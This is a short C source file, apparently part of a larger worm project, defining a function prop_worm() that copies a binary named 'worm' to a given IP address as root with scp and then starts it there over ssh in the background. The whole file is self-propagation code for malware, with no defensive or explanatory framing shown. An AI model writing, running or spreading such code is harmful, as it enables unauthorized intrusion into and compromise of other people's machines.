#include <stdio.h>
#include <stdlib.h>
#include "config.h"

void prop_worm(const char *ip) {
    printf("[+] Propagating worm to %s...\n", ip);

    char command[256];
    snprintf(command, sizeof(command),
        "scp worm root@%s:/tmp/worm", ip
    );
    system(command);

    snprintf(command, sizeof(command),
        "ssh root@%s 'chmod +x /tmp/worm && /tmp/worm &'", ip
    );
    system(command);
}